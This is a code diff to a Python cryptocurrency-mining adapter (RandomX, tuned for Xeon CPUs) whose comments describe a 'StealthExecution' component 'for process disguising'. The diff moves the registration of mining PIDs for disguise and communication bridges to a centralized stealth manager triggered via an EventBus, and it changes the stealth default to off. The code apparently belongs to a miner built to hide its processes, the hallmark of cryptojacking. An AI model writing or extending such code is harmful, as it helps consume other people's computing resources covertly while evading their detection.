@@ -29,7 +29,7 @@ try:
     from .low_overhead_sync import LowOverheadSynchronization, create_high_performance_sync
     from .randomx_optimizer import XeonE5OptimizedConfig
     # ✅ STEALTH INTEGRATION: Import StealthExecution for process disguising
-    from ..cloaking.stealth_exec import StealthExecution
+    from ...stealth.plugins.stealth_exec import StealthExecution
 except ImportError:
     # Fallback for standalone testing
     from optimized_calculation_chain import OptimizedCalculationChain, create_optimized_mining_chain
@@ -554,7 +554,7 @@ class MiningIntegrationAdapter:
         
         self.logger.info("MiningIntegrationAdapter initialized")
     
-    def initialize_optimized_mining(self, cores: int = 8, config: Optional[Dict[str, Any]] = None, auto_start: bool = True, enable_stealth: bool = True) -> bool:
+    def initialize_optimized_mining(self, cores: int = 8, config: Optional[Dict[str, Any]] = None, auto_start: bool = True, enable_stealth: bool = False) -> bool:
         """
         Initialize optimized mining components với stealth capabilities.
         Replaces traditional subprocess.Popen approach.
@@ -584,25 +584,12 @@ class MiningIntegrationAdapter:
                 )
                 self.logger.info(f"[INIT-LOG] Configuration generated: {config}")
             
-            # ✅ STEALTH INTEGRATION: Initialize stealth execution trước mining components
-            if enable_stealth and StealthExecution:
-                self.logger.info(f"[INIT-LOG] Initializing stealth execution system...")
-                try:
-                    self.stealth_executor = StealthExecution(
-                        logger=self.logger,
-                        comm_rotation_interval=45  # From cpu_plugins.yml config
-                    )
-                    if self.stealth_executor.start():
-                        self.stealth_enabled = True
-                        self.logger.info(f"[INIT-LOG] ✅ Stealth execution system started")
-                    else:
-                        self.logger.warning(f"[INIT-LOG] ⚠️ Failed to start stealth execution - continuing without stealth")
-                        self.stealth_executor = None
-                except Exception as stealth_error:
-                    self.logger.warning(f"[INIT-LOG] ⚠️ Stealth initialization failed: {stealth_error} - continuing without stealth")
-                    self.stealth_executor = None
+            # ✅ STEALTH REFACTOR: Stealth initialization moved to centralized StealthActivationManager
+            # External stealth will be activated via EventBus after PID registration
+            if enable_stealth:
+                self.logger.info(f"[INIT-LOG] Stealth mode will be activated via EventBus after PID registration")
             else:
-                self.logger.info(f"[INIT-LOG] Stealth disabled or not available")
+                self.logger.info(f"[INIT-LOG] Stealth mode disabled by configuration")
             
             # ✅ IPC INTEGRATION: Initialize ProcessCommunicationBridge for stealth processes
             if enable_stealth:
@@ -620,13 +607,8 @@ class MiningIntegrationAdapter:
                 raise RuntimeError("Failed to create calculation chain")
             self.logger.info(f"[INIT-LOG] ✅ Calculation chain created")
             
-            # ✅ STEALTH INTEGRATION: Add mining process to stealth tracking
-            if self.stealth_enabled and self.stealth_executor:
-                current_pid = os.getpid()
-                if self.stealth_executor.add_process(current_pid):
-                    self.logger.info(f"[INIT-LOG] ✅ Added main mining process PID {current_pid} to stealth tracking")
-                else:
-                    self.logger.warning(f"[INIT-LOG] ⚠️ Failed to add main process to stealth tracking")
+            # ✅ STEALTH REFACTOR: Process stealth will be activated via EventBus
+            # Main mining process stealth activation moved to centralized system
             
             self.logger.info(f"[INIT-LOG] Creating workload distributor...")
             self.workload_distributor = create_balanced_distributor(cores=cores, logger=self.logger)
@@ -838,25 +820,9 @@ class MiningIntegrationAdapter:
             
             self.external_processes.append(pid)
             
-            # ✅ STEALTH INTEGRATION: Add external process to stealth tracking
-            if self.stealth_enabled and self.stealth_executor:
-                if self.stealth_executor.add_process(pid):
-                    self.logger.info(f"🔒 [STEALTH] Added external process PID={pid} to stealth tracking")
-                    # Store disguised process information
-                    self.disguised_worker_pids[pid] = {
-                        'original_pid': pid,
-                        'registration_time': time.time(),
-                        'stealth_enabled': True
-                    }
-                    
-                    # ✅ IPC INTEGRATION: Create communication bridge for disguised process
-                    if self.communication_bridge:
-                        if self.communication_bridge.create_bridge_for_process(pid):
-                            self.logger.info(f"🌉 [IPC] Created communication bridge for disguised process PID={pid}")
-                        else:
-                            self.logger.warning(f"⚠️ [IPC] Failed to create communication bridge for PID={pid}")
-                else:
-                    self.logger.warning(f"⚠️ [STEALTH] Failed to add external process PID={pid} to stealth tracking")
+            # ✅ STEALTH REFACTOR: External process stealth will be activated via EventBus
+            # after PID registration. Stealth activation moved to centralized system.
+            self.logger.info(f"📝 [STEALTH] External process PID={pid} stealth will be activated via EventBus")
             
             # Enable monitoring for external process
             if self.workload_distributor:
@@ -1138,17 +1104,8 @@ class MiningIntegrationAdapter:
             if self.is_running:
                 self.stop_mining_session()
             
-            # ✅ STEALTH INTEGRATION: Cleanup stealth execution system
-            if self.stealth_enabled and self.stealth_executor:
-                try:
-                    self.logger.info("🧹 [STEALTH] Cleaning up stealth execution system...")
-                    self.stealth_executor.stop()
-                    self.stealth_executor = None
-                    self.stealth_enabled = False
-                    self.disguised_worker_pids.clear()
-                    self.logger.info("✅ [STEALTH] Stealth execution cleanup completed")
-                except Exception as stealth_cleanup_error:
-                    self.logger.error(f"❌ [STEALTH] Error cleaning up stealth execution: {stealth_cleanup_error}")
+            # ✅ STEALTH REFACTOR: Stealth cleanup handled by centralized StealthActivationManager
+            # No local stealth cleanup needed as stealth is managed externally
             
             # ✅ IPC INTEGRATION: Cleanup communication bridge
             if self.communication_bridge:
